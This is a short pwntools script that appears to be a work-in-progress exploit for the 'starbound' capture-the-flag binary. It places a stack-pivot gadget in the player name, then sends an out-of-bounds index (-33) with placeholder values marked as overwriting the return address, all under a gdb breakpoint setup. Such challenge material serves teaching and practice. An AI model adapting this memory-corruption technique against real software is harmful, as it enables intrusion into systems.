#!/usr/bin/env python3

from pwn import *

elf = ELF("./starbound")
context.update(binary=elf, log_level="DEBUG")
p = elf.process()
gdb.attach(
    p,
    """
    b *main+79
    b *main+88
""",
)

gadget = 0x08048E48  #: add esp, 0x1c ; ret

p.sendlineafter(b"> ", b"6")
p.sendlineafter(b"> ", b"2")
payload = b""
payload += p32(gadget)
# NAME_80580D0
p.sendlineafter(b"name: ", payload)
p.sendlineafter(b"> ", b"1")  # => go to main menu

### out-of-bound ###
pl = b""
pl += b"-33\x00"
pl += p32(0xDEADBEEF)
pl += b"ABCD" #overwrite RIP
p.sendlineafter(b"> ", pl)


p.interactive()
